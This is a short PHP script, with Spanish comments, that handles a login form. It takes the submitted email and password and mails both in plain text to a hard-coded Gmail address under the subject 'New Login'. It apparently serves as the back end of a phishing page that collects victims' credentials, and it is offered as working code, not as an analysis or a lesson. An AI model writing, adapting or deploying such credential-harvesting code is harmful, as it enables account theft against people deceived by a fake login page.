<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger los datos del formulario
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = htmlspecialchars($_POST['password']);

    // Configuración del correo
    $to = 'munezbautista2@gmail.com';
    $subject = 'Nuevo Inicio de Sesión';
    $message = "Correo electrónico: $email\nContraseña: $password";
    $headers = "From: no-reply@tudominio.com";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo 'Correo enviado con éxito.';
    } else {
        echo 'Hubo un problema al enviar el correo.';
    }
} else {
    echo 'Acceso no autorizado.';
}
?>